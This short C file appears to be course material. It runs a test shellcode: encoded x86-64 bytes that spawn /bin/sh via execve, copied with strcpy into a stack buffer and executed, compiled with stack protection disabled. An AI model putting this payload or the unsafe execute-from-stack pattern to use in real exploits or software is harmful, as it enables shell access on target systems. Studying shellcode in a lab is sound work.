/*
 * Testing a shellcode
 * (c) Elias Athanasopoulos,  athanasopoulos.elias@ucy.ac.cy
 *
 * Compile the attached C program.
 * $ gcc -Wall -z execstack run-shellcode.c -o run-shellcode
 * 
 * Run the program, normally.
*/

#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {

	char buff[128];

    const char *shellcode = "\x48\x31\xc0\x50\x49\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x51\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

strcpy(buff, shellcode);

	int (*fptr)() = (int (*)()) buff;
	
	fptr();

	return 1;
}

